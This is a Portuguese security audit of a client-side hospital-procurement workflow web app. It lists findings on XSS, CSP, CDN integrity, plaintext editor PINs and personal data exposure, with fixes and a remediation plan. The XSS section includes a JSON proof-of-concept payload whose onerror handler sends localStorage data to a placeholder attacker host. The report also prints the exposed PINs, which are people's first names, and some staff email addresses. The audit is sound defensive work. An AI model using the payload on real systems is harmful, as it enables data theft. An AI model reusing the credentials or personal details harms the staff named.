# Auditoria de Segurança — `qzte/supermercados`

**Data:** 2026-08-04
**Versão auditada:** v3.15.1 (`ec2a05a`)
**Corrigidos:** A2 e A2b em v3.15.2 · A5 e A9 em v3.15.3
**Alvo:** `src/index.src.html` (fonte), `index.html` (servido), `tools/build.mjs`,
`.github/workflows/build.yml`, `workflow-default.json`, `email-template.json`,
`manifest.webmanifest`, histórico Git.

> As referências a linhas (`ficheiro:linha`) são da revisão auditada `ec2a05a`.
> As correcções acrescentaram código, pelo que na versão actual estão deslocadas
> — os nomes das funções continuam a ser o ponto de entrada fiável.

---

## Contexto e modelo de ameaça

A aplicação é **100 % client-side**: um único HTML servido por GitHub Pages, sem
backend, sem API, sem base de dados. Todo o estado vive em `localStorage` e em
ficheiros JSON trocados manualmente entre utilizadores.

Isto elimina classes inteiras de risco (injecção SQL, SSRF, IDOR, gestão de
sessão) mas tem uma consequência que enquadra tudo o que se segue: **não existe
fronteira de segurança entre a aplicação e o utilizador**. Nenhum controlo
implementado no cliente pode impedir alguém com acesso ao browser de fazer o que
quiser. Os achados abaixo classificam-se, por isso, em duas famílias:

1. **Riscos reais** — código que pode ser explorado por *terceiros* (ficheiros
   maliciosos, CDN comprometida, dados públicos).
2. **Controlos decorativos** — mecanismos que aparentam proteger e não protegem,
   perigosos sobretudo por criarem falsa confiança na integridade dos registos.

Adversários considerados: (a) quem acede ao repositório e ao site públicos;
(b) quem envia um ficheiro JSON de workflow/backup a um utilizador legítimo;
(c) comprometimento de uma CDN de terceiros; (d) utilizador interno a adulterar
o histórico do processo.

---

## Resumo executivo

| # | Achado | Severidade | Explorável por terceiros | Estado |
|---|---|---|---|---|
| A1 | PINs de editor em claro no ficheiro servido | **Alta** | Sim | aberto |
| A2 | XSS armazenado via ficheiro de workflow/backup importado | **Alta** | Sim | ✅ v3.15.2 |
| A2b | Execução via `blob:` no visualizador de PDF | **Alta** | Sim | ✅ v3.15.2 |
| A3 | Ausência total de Content-Security-Policy | **Média** | Amplifica A2/A4 | aberto |
| A4 | Scripts de terceiros (CDN) sem Subresource Integrity | **Média** | Sim | aberto |
| A5 | Dados pessoais e institucionais em repositório público | **Média** | Sim | ✅ v3.15.3 (parcial) |
| A6 | Integridade dos dados não verificável (registos adulteráveis) | **Média** | Interno | aberto |
| A7 | `xlsx` 0.18.5 e restantes bibliotecas CDN desactualizadas | **Baixa** | Improvável | aberto |
| A8 | `eval()` na geração de PDF | **Baixa** | Não (hoje) | aberto |
| A9 | GitHub Actions com `contents: write` e actions não fixadas por SHA | **Baixa** | Interno | ✅ v3.15.3 |
| A10 | **Regressão:** correcções de segurança anteriores foram perdidas | **Processo** | — | parcial |

Duas prioridades sobressaem: **A2** (única via de execução de código por um
atacante externo) e **A10** (o repositório já teve estas correcções e perdeu-as;
sem mudar o processo, voltará a perdê-las).

---

## Achados detalhados

### A1 — PINs de editor em claro no ficheiro servido · **Alta**

**Evidência** — `src/index.src.html:662` (e `index.html:663`, publicado):

```js
window.__ULSM_EDITOR_PINS = ["JOAQUIM", "MARTA", "MARIANA", "JESSICA", "ANA"];
```

A validação (`src/index.src.html:668-675`) compara a entrada com esta lista,
ignorando maiúsculas e espaços.

**Impacto** — O ficheiro é público em <https://qzte.github.io/supermercados/> e
em <https://github.com/qzte/supermercados>. Qualquer visitante lê a lista com
*Ver código-fonte*. O modo editor — que permite reescrever o workflow, os
templates de e-mail e os registos dos processos — está efectivamente aberto.
Acresce que os PINs são **nomes próprios de pessoas reais**, adivinháveis mesmo
sem ler o código, e a sua publicação constitui divulgação desnecessária de dados
pessoais (ver A5).

**Nota de enquadramento** — Sendo a aplicação puramente client-side, *nenhum*
esquema de PIN oferece segurança real: quem quiser contorná-lo altera o estado
React na consola. O PIN só faz sentido como travão contra edição acidental. Na
forma actual não cumpre sequer esse papel e ainda expõe nomes.

**Recomendação**
- Curto prazo: substituir a lista por hashes SHA-256 injectados em runtime — foi
  exactamente o que o commit `e398354` fez e que se perdeu (ver A10) — e falhar
  em modo seguro (editor desactivado) quando não houver hash configurado.
- Correcto: se a integridade dos registos importa, autenticar no servidor
  (SSO/OIDC da instituição) — o que implica deixar de ser uma app só de cliente.
- Em qualquer caso: **não usar nomes de pessoas como credencial**.

---

### A2 — XSS armazenado via ficheiro de workflow/backup importado · **Alta**

Este é o achado com maior impacto explorável.

**Evidência** — dois sinks de HTML sem sanitização em
`src/index.src.html:6849` e `6869`:

```jsx
<div className="phase-title" style={{color}}
     dangerouslySetInnerHTML={{__html: ph.label || ph.title || ''}} />
...
<div dangerouslySetInnerHTML={{__html:
  (step.instructions || step.body || '')
    .replace(/<button[^>]*class="email-btn"[^>]*>[\s\S]*?<\/button>/gi, '')
    .replace(/\n/g, '<br>')
}} />
```

O `.replace()` remove um botão específico; **não é sanitização** e não impede
`<img>`, `<svg>`, `<iframe>` nem atributos de evento.

O valor chega até ali sem qualquer validação. `buildPhasesFromData()`
(`src/index.src.html:974-991`) copia `label` e `instructions` tal e qual:

```js
label: ph.label || ph.title || `Fase ${idx+1}`,
...
instructions: s.instructions || s.body || '',
```

**Vias de entrada** (todas terminam em `buildPhasesFromData`):

| Via | Localização |
|---|---|
| Backup JSON escolhido pelo utilizador | `loadFromFile` → `normalizeBackup` (`:2955`, `workflow: parsed.workflow`) |
| Template de workflow importado | `<input type="file" accept=".json">` (`:575`, `:5688`, `:6509`) |
| `workflow-default.json` obtido por `fetch` | ecrã de arranque, origem "publicada" |
| `localStorage['workflowTemplate']` | reaplicado em cada arranque (`:1731`, `:8200`) |

Como o workflow importado é gravado em `localStorage` (`:1177`, `:5448`,
`:8200`), o payload **persiste entre sessões** — é XSS armazenado, não reflectido.

**Prova de conceito** — basta que um utilizador importe um ficheiro contendo:

```json
{ "phases": [ { "label": "<img src=x onerror=\"alert(document.domain)\">",
                "steps": [ { "instructions": "<img src=x onerror=\"fetch('https://atacante/'+btoa(localStorage.getItem('ulsm_procs')))\">" } ] } ] }
```

**Impacto** — Execução de JavaScript na origem `qzte.github.io`, com acesso a
todo o `localStorage` (registos de processos, plano anual, templates de e-mail).
Permite exfiltrar os dados dos processos, alterar silenciosamente destinatários e
conteúdos dos templates de e-mail institucional (que dirigem correspondência real
para endereços `@ulsm.min-saude.pt`), e falsificar registos. A troca de ficheiros
JSON entre colegas é **o mecanismo normal de partilha desta aplicação**, o que
torna o vector plausível, não teórico.

#### ✅ Corrigido em v3.15.2

**Correcção da recomendação original.** A primeira versão deste relatório
recomendava trocar os dois sinks por texto simples, com o argumento de que o
`workflow-default.json` publicado não tem uma única etiqueta HTML. O facto está
certo, a conclusão estava errada: **as imagens e os PDFs anexados aos passos são
guardados como HTML dentro das próprias `instructions`** — o editor insere-os no
`.step-body` (`:1845`, `:2088`) e o `serializeWorkflow()` captura o `innerHTML`
desse elemento. Passar a texto simples teria apagado silenciosamente todos os
anexos de quem os usa. A recomendação válida era a segunda: sanitizar.

O que foi feito:

1. **`sanitizeRichText()`** — allowlist construída a partir do que o editor
   realmente produz. O parse é feito com `DOMParser.parseFromString`, que cria um
   documento inerte (os `<script>` não correm, os `src`/`href` não são pedidos à
   rede), e depois a árvore é percorrida: tags fora da allowlist são
   desembrulhadas (perde-se a tag, mantém-se o texto), tags cujo conteúdo é
   código ou metadados (`script`, `style`, `iframe`, `svg`, `form`…) são
   removidas com a subárvore, e todos os atributos `on*` e `style` caem. Filtrar
   HTML com expressões regulares nunca é seguro; por isso o trabalho é do parser.
2. **Aplicado no `buildPhasesFromData()`**, que é o ponto de passagem obrigatório
   — verificou-se que **as oito atribuições a `window.__ULSM_PHASES` passam todas
   por lá**, pelo que as quatro vias de entrada da tabela acima ficam cobertas
   num só sítio.
3. **Guarda no `tools/build.mjs`** que falha o build se o `sanitizeRichText`
   desaparecer, se o `buildPhasesFromData` deixar de o chamar duas vezes, ou se
   aparecer um `dangerouslySetInnerHTML` novo. É a resposta directa ao A10: a
   correcção anterior perdeu-se por substituição de ficheiro, sem conflito e sem
   aviso — agora o build dá o aviso.

**Verificação.** Suite de 29 testes em Chromium (Playwright) contra a aplicação
servida por HTTP, com o React carregado para o render ser mesmo exercitado: 13
payloads bloqueados (`onerror`, `<script>`, `<svg onload>`, `srcdoc`,
`ontoggle`, `formaction`, `javascript:`, variações de maiúsculas e sem aspas),
9 casos de conteúdo legítimo preservados (listas, negrito, `<br>`, acentos,
imagem anexada, pill de PDF com o seu `data-pdf-path`), e o ataque
ponta-a-ponta. Como controlo negativo, a mesma prova corrida contra o código de
`main` anterior à correcção: **os dois payloads executam**. Depois da correcção,
nenhum.

**Nota relacionada** — `serializeWorkflow()` lê `innerHTML` dos elementos
`contenteditable` (`:1147`, `:1156`). Colar texto formatado (de Word, de uma
página web) no editor continua a gravar markup no template. Deixou de ser um
risco de segurança — tudo o que sai dali volta a passar pelo `sanitizeRichText`
na leitura — mas continua a poluir os dados.

---

### A2b — Execução via `blob:` no visualizador de PDF · **Alta** · ✅ Corrigido em v3.15.2

Achado durante a correcção do A2, e não identificado na primeira análise.

**Evidência** — `openPdfPopup()` construía o Blob com o MIME lido do próprio
`data:` URL e punha-o no `<embed>`:

```js
const mime = header.match(/:(.*?);/)[1];
const blob = new Blob([arr], {type: mime});
_pdfPopupBlobUrl = URL.createObjectURL(blob);
document.getElementById('pdfPopupEmbed').src = _pdfPopupBlobUrl;
```

**Impacto** — Um `data-pdf-path` com `data:text/html;base64,…` produzia um
`blob:` de tipo `text/html`. Os `blob:` herdam a origem de quem os cria, pelo que
o conteúdo executava **na origem da aplicação**, com o mesmo alcance do A2. Era
um segundo caminho para o mesmo resultado, e sobreviveria a uma correcção que
tratasse apenas dos sinks de render.

**Correcção** — O `sanitizeRichText` só aceita `data-pdf-path`/`data-pdf-src`
com MIME `application/pdf`, e o `openPdfPopup` verifica o MIME outra vez antes de
criar o Blob, recusando e avisando em vez de abrir. O `catch` de fallback também
deixou de reencaminhar o `data:` URL original para o `<embed>` — passar ao
browser exactamente o conteúdo que se acabou de rejeitar não é um fallback.

**Nota menor, corrigida no mesmo passo** — o nome do ficheiro PDF era
interpolado sem escape em `pill.innerHTML` (`:1850`). Um PDF chamado
`<img src=x onerror=…>.pdf` injectava HTML, que o `serializeWorkflow` gravava
depois nas `instructions`. Passou a `textContent`.

---

### A3 — Ausência de Content-Security-Policy · **Média**

**Evidência** — nem `src/index.src.html` nem `index.html` contêm
`<meta http-equiv="Content-Security-Policy">`. O GitHub Pages não permite
configurar cabeçalhos HTTP, pelo que a `meta` é a única via disponível.

**Impacto** — Nada limita o que um script injectado (A2) ou uma CDN comprometida
(A4) pode fazer: qualquer origem de exfiltração está disponível. Uma CSP não
corrige A2, mas transforma "exfiltração silenciosa de todos os dados" em
"execução bloqueada ou sem canal de saída".

**Recomendação** — acrescentar ao `<head>` (antes de qualquer `<script>`):

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
  style-src  'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src   https://fonts.gstatic.com;
  img-src    'self' data: blob:;
  connect-src 'self';
  frame-src  blob: data:;
  base-uri   'none';
  form-action 'none';
  object-src 'none'">
```

Observações de implementação:
- `'unsafe-inline'` em `script-src` é hoje inevitável — o `build.mjs` emite o
  código compilado num `<script>` inline. É preferível calcular o **hash SHA-256
  do bloco** no build e emitir `'sha256-…'`, eliminando o `'unsafe-inline'`; a
  alteração cabe em poucas linhas de `tools/build.mjs`.
- `connect-src 'self'` é suficiente: os únicos `fetch()` da app são os três JSON
  relativos.
- `frame-src blob: data:` é necessário para o visualizador de PDF (`:1873`) e
  para o `iframe.srcdoc` da exportação (`:7366`).
- **`'unsafe-eval'` foi deliberadamente omitido** — vai colidir com A8; ver ali.
- Validar em `file://`, cenário que o README documenta como suportado.

---

### A4 — Scripts de terceiros sem Subresource Integrity · **Média**

**Evidência** — `src/index.src.html:19-21` (React, ReactDOM, Babel) e o
carregamento dinâmico em `loadLib()` (`:7183-7189`), usado para
`jspdf` (`:7375`), `html2canvas` (`:7376`) e `xlsx` (`:7409`). Nenhum tem
atributo `integrity`. O `crossorigin` e o `referrerpolicy` já estão presentes —
falta apenas o `integrity`, que é o que garante que o ficheiro não mudou.

**Impacto** — Comprometimento do cdnjs (ou de DNS/TLS no percurso) resulta em
execução de código arbitrário na aplicação, com o mesmo alcance descrito em A2.
São **cinco** bibliotecas de terceiros a correr com plena confiança.

**Recomendação**
- Acrescentar `integrity="sha384-…"` às três tags estáticas (o cdnjs publica os
  hashes na sua interface).
- Estender `loadLib()` para aceitar e aplicar o hash:
  ```js
  async function loadLib(url, check, integrity) {
    if (check()) return;
    await new Promise((resolve, reject) => {
      const s = document.createElement('script');
      s.src = url;
      if (integrity) { s.integrity = integrity; s.crossOrigin = 'anonymous'; }
      s.referrerPolicy = 'no-referrer';
      s.onload = resolve; s.onerror = reject;
      document.head.appendChild(s);
    });
  }
  ```
- Alternativa mais robusta, e coerente com a filosofia do repositório (tudo
  servido da raiz): **alojar as bibliotecas localmente**. Elimina A4 por completo,
  permite `script-src 'self'` na CSP e faz a app funcionar sem rede — hoje, se o
  cdnjs estiver inacessível, a aplicação não arranca de todo (o próprio
  `bootGuard` o admite, `:54`).

---

### A5 — Dados pessoais e institucionais em repositório público · **Média**

**Evidência** — `email-template.json`, `workflow-default.json` e a cópia inline
no HTML continham **quatro** endereços nominais, concentrados em dois campos:

| Onde | Conteúdo |
|---|---|
| `ccira.para` | `ana.durães@ulsm.min-saude.pt` |
| `conclusaoSFSL.cc` | `filipe.sousa@` · `marta.lourenco@` · `vera.soares.lopes@` |
| `workflow-default.json`, passo 2.7 | `ana.durães@ulsm.min-saude.pt` |
| `conclusaoSFSL.body` | cinco nomes próprios de pessoas |

Os restantes endereços (`gestao.supermercados@`, `tsdt.farmacia@`,
`farmacêuticos_ulsm@`) são **caixas de função**, não pessoas.

Somam-se os cinco nomes próprios usados como PIN (A1) e os cinco nomes completos
da constante `TEAM` (`:2424`) — estes últimos, ao contrário dos endereços, são
funcionais: alimentam a lista de responsáveis por processo.

**Impacto** — O repositório e o site são públicos e indexáveis. O conjunto
"nomes + endereços + estrutura interna do processo + templates de e-mail reais"
é material pronto para *phishing* dirigido contra uma unidade de saúde: um
atacante consegue reproduzir a linguagem, os remetentes e o momento exacto do
processo em que cada mensagem é esperada. É também uma questão de minimização de
dados à luz do RGPD.

#### ✅ Corrigido em v3.15.3

A correcção acabou por não ser uma redacção, mas uma **reposição da convenção que
o próprio repositório já seguia**: 11 dos 13 templates identificam
destinatários por função (`"Serviço Clínico: Enfermeiro(a) gestor(a)"`,
`"Diretor(a) SF · Diretor(a) SL · …"`). Os dois campos com endereços nominais
eram a excepção, não a regra. Passaram a:

| Campo | Antes | Depois |
|---|---|---|
| `ccira.para` | endereço nominal | `Serviços Farmacêuticos: Farmacêutico(a) da CCIRA` |
| `conclusaoSFSL.cc` | três endereços nominais | `Chefias dos SF e SL` |
| passo 2.7 do workflow | `… CCIRA (endereço nominal)` | `… pela farmacêutica CCIRA` |
| `conclusaoSFSL.body` | cinco nomes próprios | `<FILL>[indicar responsáveis]</FILL>` |

Identificar por função é também mais robusto do que por pessoa: sobrevive a
mudanças de equipa, que era o que fazia estes campos envelhecerem.

**Deliberadamente não adivinhado** — os três endereços do `cc` pertenciam a
pessoas cujos cargos exactos não constam do repositório. Em vez de inventar
"Diretor(a) SF · Diretor(a) SL · Gestor(a) SF", ficou `Chefias dos SF e SL`. Se
a lista precisa for útil, é uma edição de uma linha por quem sabe os cargos.

**Guarda contra reintrodução** — `tools/validate.mjs` passa a falhar perante
qualquer endereço nos JSON servidos que não esteja na lista de caixas de função.
Acrescentar um endereço nominal à lista derrota o propósito; a mensagem de erro
di-lo e aponta as alternativas. Testado: repondo o endereço removido, o
validador falha com código 1.

**Verificação** — 8 testes em Chromium contra a app servida por HTTP: os 13
templates carregam do ficheiro servido (e não do fallback inline), os dois
campos têm o valor novo, o modal de e-mail abre, o `<FILL>` do corpo renderiza
como campo a preencher, e não sobra nenhum nome próprio nem endereço nominal no
que o utilizador vê.

**Fica por resolver** — três coisas que esta correcção não toca:
- Os endereços **permanecem no histórico Git**, que é público. Remover de um
  ficheiro não remove do histórico, e podem já estar indexados. Tratá-los como
  divulgados.
- A constante `TEAM` (`:2424`) tem cinco nomes completos. É funcional — alimenta
  a atribuição de responsáveis — pelo que removê-la parte a aplicação. Decisão
  de quem mantém: manter, mudar para iniciais, ou passar a dados carregados do
  backup em vez de código.
- Os PINs continuam a ser nomes próprios (A1).

**Alternativa não seguida** — tornar o repositório privado resolveria os três
pontos de uma vez, mas o GitHub Pages passaria a exigir plano pago e o site
deixaria de estar acessível no URL público que a equipa usa. Fica registada como
opção, não como recomendação.

**Ponto positivo** — o `ulsm_supermercados_backup.json` versionado está vazio
(`"data": []`) e, verificado em todo o histórico, **nunca** conteve registos
reais. O desenho de manter os dados fora do repositório está a ser respeitado.

---

### A6 — Integridade dos dados não verificável · **Média** (risco de negócio)

**Evidência** — Todo o estado reside em `localStorage` e em ficheiros JSON sem
assinatura nem *checksum*. `createStorageEnvelope()` (`:2617`) grava `version` e
`updatedAt`, que são metadados informativos, não garantias.

**Impacto** — Qualquer utilizador local (ou extensão de browser) pode alterar
datas de conclusão, responsáveis e notas de um processo sem deixar rasto. Como a
aplicação apresenta um "modo editor" protegido por PIN, os registos aparentam ter
controlo de acesso e trilho de auditoria que **não existem**. Para um processo
de revisão com valor de auditoria interna, é este o risco com maior consequência
prática, ainda que não seja uma "vulnerabilidade" no sentido clássico.

**Recomendação** — Decidir explicitamente o modelo:
- Se os registos precisam de valor probatório: persistência do lado do servidor,
  com autenticação e log imutável. Nada feito no cliente substitui isto.
- Se a app se mantém local: assumir e **documentar** que os dados são
  auto-declarados, acrescentar um `sha256` do bloco `data` no envelope para
  detectar corrupção acidental (não adulteração intencional), e deixar de
  apresentar o PIN como controlo de acesso.

---

### A7 — Bibliotecas de terceiros desactualizadas · **Baixa**

| Biblioteca | Versão | Situação |
|---|---|---|
| `xlsx` (SheetJS) | 0.18.5 | CVE-2023-30533 (*prototype pollution*, corrigido em 0.19.3); CVE-2024-22363 (ReDoS, corrigido em 0.20.2) |
| `jspdf` | 2.5.1 | Vários anos de correcções em atraso (actual: série 3.x) |
| `html2canvas` | 1.4.1 | Sem manutenção activa |
| `react` / `react-dom` | 18.2.0 | Sem CVE conhecido; desactualizado |

**Exploração** — Baixa. Ambos os CVE do `xlsx` estão no caminho de **leitura** de
ficheiros; a aplicação só usa `aoa_to_sheet`/`writeFile`, isto é, **escreve**
(`:7409-7467`). Não há entrada controlada por atacante no *parser*.

**Nota importante** — Estas dependências vêm de CDN e **não constam do
`package.json`**, pelo que o `npm audit` não as vê (corri-o: 0 vulnerabilidades —
resultado que diz respeito apenas ao Babel do build). Não existe hoje nenhum
processo que sinalize CVE nestas cinco bibliotecas.

**Recomendação** — Actualizar `jspdf` e `html2canvas`; para o SheetJS, notar que
saiu do npm e é distribuído em `cdn.sheetjs.com`. Ao alojar as bibliotecas
localmente (A4), passam a ser rastreáveis por ferramentas de dependências.

---

### A8 — `eval()` na geração de PDF · **Baixa**

**Evidência** — `src/index.src.html:7319-7323`:

```js
const cleanFnSrc = fillFnSource.replace(/;\s*$/, '');
iframeWin.eval(`(${cleanFnSrc})(${JSON.stringify(fillData)});`);
```

`fillFnSource` é extraído por expressão regular dos templates HTML embutidos
(`extractFn`, `:7385-7388`).

**Avaliação** — **Não é explorável hoje**: a fonte é uma constante do próprio
ficheiro (`window.__ULSM_TEMPLATE_MENSAL`/`_ANUAL`), não entrada do utilizador.
Fica registado por três razões: é um sink de execução de código a poucos passos
de dados variáveis; extrair código por regex sobre HTML é frágil e uma edição
inocente do template pode partir a correspondência; e **obriga a `'unsafe-eval'`
na CSP** (A3), enfraquecendo-a para toda a aplicação.

**Recomendação** — Injectar a função por declaração no `srcdoc` do iframe e
invocá-la por referência (`iframeWin.ULSM_fillMonthlyReport(data)`), em vez de a
reconstruir a partir de texto. Remove o `eval` e permite uma CSP sem
`'unsafe-eval'`.

---

### A9 — Pipeline de CI · **Baixa**

**Evidência** — `.github/workflows/build.yml`: `permissions: contents: write`,
gatilho `on: push` em **todos** os branches, executa `npm ci` e
`node tools/build.mjs`, e faz `git push` com o `GITHUB_TOKEN`.

**Avaliação** — Correctamente desenhado no essencial: só `push` (nunca
`pull_request_target`), pelo que **forks não conseguem accionar o workflow** — o
comentário no ficheiro mostra que a decisão foi ponderada. O risco residual é
que qualquer pessoa com permissão de escrita possa executar código arbitrário
com um token de escrita, alterando `tools/build.mjs` ou um script de
`package.json`. Quem tem escrita já pode escrever, pelo que a escalada é mínima.

#### ✅ Corrigido em v3.15.3

O `ci.yml` já tinha nascido endurecido; o que faltava era o `build.yml`, que é o
workflow com `contents: write`. Os três pontos aplicados:

| | |
|---|---|
| Actions fixadas por SHA | uma tag pode ser reapontada para outro commit, e o CI passaria a executar código diferente sem que nada mudasse no repositório |
| `persist-credentials: false` | o token deixa de estar em `.git/config` enquanto correm o `npm ci` e o `tools/build.mjs` — passos que executam código do repositório e das suas dependências |
| `npm ci --ignore-scripts` | nenhuma dependência tem scripts de instalação legítimos a correr aqui |

O passo de push passa a autenticar-se sozinho, com o token só no ambiente desse
passo e o URL passado como argumento — `git push <url>` não escreve nada no
`.git/config`. O refspec é explícito (`HEAD:refs/heads/$GITHUB_REF_NAME`) porque
sem credenciais persistidas não há upstream configurado.

**O que fica por verificar, e porquê.** O passo de commit/push do `build.yml`
**nunca correu neste repositório** — não existe um único commit de
`github-actions[bot]` nem nenhum com a mensagem `build: regenerar index.html`
em todo o histórico. Na prática quem edita tem sempre feito o build localmente e
commitado o resultado, pelo que o workflow encontra sempre "nada a fazer" e sai
antes do push. Isto é anterior a esta alteração: o caminho já era código morto.

A mecânica de git foi verificada localmente contra um repositório *bare* — o
refspec funciona sem remote configurado e nada fica gravado no `.git/config`. O
que não foi exercitado é a autenticação por token, que é o padrão mais comum do
GitHub Actions. Continua a falhar de forma ruidosa (o passo dá erro e o workflow
fica vermelho) e não em silêncio.

Para o exercitar de propósito: editar `src/index.src.html` pela interface web do
GitHub sem fazer o build — que é exactamente o cenário para o qual esta rede de
segurança existe, e está documentado no README.

**Não alterado, deliberadamente** — o `permissions: contents: write` fica: é o
mínimo para um workflow que faz commit. E o gatilho continua a ser só `push`,
que é o que impede forks de accionarem o workflow.

---

### A10 — Regressão: correcções de segurança anteriores foram perdidas · **Processo**

Este achado explica por que razão vários dos anteriores existem.

O repositório **já tinha** estas correcções aplicadas. Três commits, todos
ancestrais de `main`:

| Commit | Data | O que fez |
|---|---|---|
| `e398354` | 2026-02-27 | Removeu o PIN fixo; passou a validar SHA-256 contra hash injectado em runtime |
| `a7f6e88` | 2026-02-27 | Verificação de integridade do estado e validação de esquema |
| `2071ee1` | 2026-02-27 | Endureceu a CSP |
| `44f0116` | 2026-03-02 | Endureceu a autenticação do editor e sanitizou a serialização dos passos |

Nenhuma destas defesas existe no código actual. O motivo é visível no histórico:
as correcções foram aplicadas a `ulsm_supermercados.jsx` e
`workflow_supermercados.html`, ficheiros posteriormente **substituídos por
commits "Add files via upload"** (`4e8098f`, 2026-03-01; `d61b47f`, 2026-07-19)
— carregamentos de cópias locais que não continham as correcções. O
`SECURITY_AUDIT.md` que as documentava foi apagado em `53e206b` (2026-07-24).

Ou seja: **o trabalho de segurança foi silenciosamente desfeito por substituição
de ficheiros**, sem conflito de merge e sem aviso. O padrão repetiu-se duas
vezes com quatro meses de intervalo, e voltará a repetir-se enquanto o fluxo for
"editar uma cópia local e fazer upload".

Consequência adicional: o PIN antigo `ulsm2025` permanece legível no histórico
público (`SECURITY_AUDIT.md`, `dc02567` e outros), tal como qualquer credencial
que venha a ser removida por commit — **remover do ficheiro não remove do Git**.

**Recomendação**
- Deixar de usar "Add files via upload" para actualizar a aplicação. O
  `src/index.src.html` é hoje a fonte única e o `build.mjs` já garante coerência
  do resto; editar aí, com PR.
- Manter este documento versionado e revê-lo a cada alteração relevante.
- Considerar um teste no `build.mjs` que falhe o build perante padrões proibidos
  (ex.: lista de PINs em claro, `dangerouslySetInnerHTML` sem sanitização) —
  o ficheiro já usa esta técnica com sucesso para o Babel e para o esquema do
  `workflow-default.json`. Uma verificação equivalente teria impedido a regressão.
- Tratar `ulsm2025` e os PINs actuais como **comprometidos e públicos**; qualquer
  credencial futura tem de ser rodada, não apagada.

---

## O que está bem feito

Registado por ser relevante para a avaliação e para não ser desfeito:

- **`renderEmailBody()`** (`:777`) constrói o corpo do e-mail com
  `createTextNode`/`textContent` e `DocumentFragment`. É a abordagem correcta e
  contrasta com os sinks de A2 — o padrão seguro já existe no ficheiro.
- **`sanitizeProcs()` / `sanitizeProc()` / `sanitizePlan()`** (`:2605` e
  seguintes) validam esquema, tipos e comprimentos (`toSafeText`, `toSafeDate`)
  em todos os dados de processos importados, e resolvem colisões de `id`. Sólido.
  A lacuna é apenas o `workflow` (A2).
- **`bootGuard`** (`:28-70`) constrói a interface de erro com `createElement` e
  `textContent`, sem `innerHTML`.
- **`openEmail()`** (`:1762`) usa `textContent` em todos os campos.
- **`crossorigin` + `referrerpolicy="no-referrer"`** nas tags de CDN — falta só
  o `integrity`.
- Sem segredos de API, chaves ou tokens no repositório ou no histórico
  (verificado).
- `npm audit`: 0 vulnerabilidades nas dependências de build.
- O backup versionado nunca conteve dados reais.
- A decisão de usar apenas `on: push` no CI (excluindo forks) está correcta e
  documentada.

---

## Plano de remediação sugerido

**Prioridade 1 — fazer já**
1. ~~**A2**~~ ✅ **feito em v3.15.2** — sanitização por allowlist no
   `buildPhasesFromData`, mais o A2b (`blob:` no visualizador de PDF) encontrado
   durante a correcção, e uma guarda no `build.mjs` contra a regressão.
2. **A1**: retirar os PINs em claro; hashes SHA-256 injectados em runtime, ou
   assumir a app como sem controlo de acesso e remover a fachada.
3. ~~**A5**~~ ✅ **feito em v3.15.3** — endereços nominais substituídos pela
   função, guarda no `validate.mjs` contra a reintrodução. Continuam em aberto o
   histórico Git (público e já divulgado) e a constante `TEAM`.

**Prioridade 2 — próxima iteração**
4. **A3**: acrescentar a `meta` CSP (idealmente com hash do script inline
   calculado no build).
5. **A4**: `integrity` nas cinco bibliotecas de CDN, ou alojá-las localmente —
   o que também resolve o arranque sem rede.
6. **A10**: guarda no `build.mjs` contra padrões proibidos; abandonar o fluxo de
   upload de ficheiros.

**Prioridade 3 — quando houver oportunidade**
7. **A8**: eliminar o `eval()` da exportação de PDF.
8. **A7**: actualizar `jspdf`/`html2canvas`; rastrear as dependências de CDN.
9. ~~**A9**~~ ✅ **feito em v3.15.3** — `build.yml` com actions fixadas por SHA,
   `persist-credentials: false` e `--ignore-scripts`; o token só existe no passo
   de push.
10. **A6**: decidir e documentar o modelo de confiança dos registos.

---

## Limitações desta auditoria

Análise **estática** do código, da configuração e do histórico Git na revisão
`ec2a05a`. Não foram executados testes dinâmicos contra a instância publicada,
nem verificadas as definições da conta GitHub (protecção de branch,
colaboradores, configuração do Pages), nem revistos os ficheiros HTML arquivados
de versões anteriores — que, sendo gerados e idênticos ao `index.html`, partilham
os mesmos achados.

As provas de conceito apresentadas foram derivadas por leitura do código e não
foram executadas contra o sistema em produção.
